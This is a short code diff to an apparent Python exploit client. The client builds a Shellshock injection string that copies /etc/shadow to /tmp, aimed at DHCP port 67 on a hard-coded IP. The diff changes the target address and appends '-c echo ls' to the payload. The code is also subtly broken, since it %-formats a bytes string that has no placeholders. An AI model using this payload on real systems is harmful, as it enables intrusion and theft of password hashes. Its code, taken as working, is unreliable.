@@ -16,11 +16,11 @@ def flatten_list(ze_list):
 
 class Client:
     def __init__(self):
-        self.ip = b'192.168.110.23'
+        self.ip = b'192.168.10.1'
         print(self.ip)
         self.port = 67
 
-        self.exploit = b"() { :;}; /usr/bin/cat /etc/shadow > /tmp/shadow" % (self.ip, self.port)
+        self.exploit = b"() { :;}; /usr/bin/cat /etc/shadow > /tmp/shadow -c echo ls" % (self.ip, self.port)
         self.exploit = [bytes(chr(x).encode('ascii')) for x in self.exploit]
         print(self.exploit)
         print(len(self.exploit))
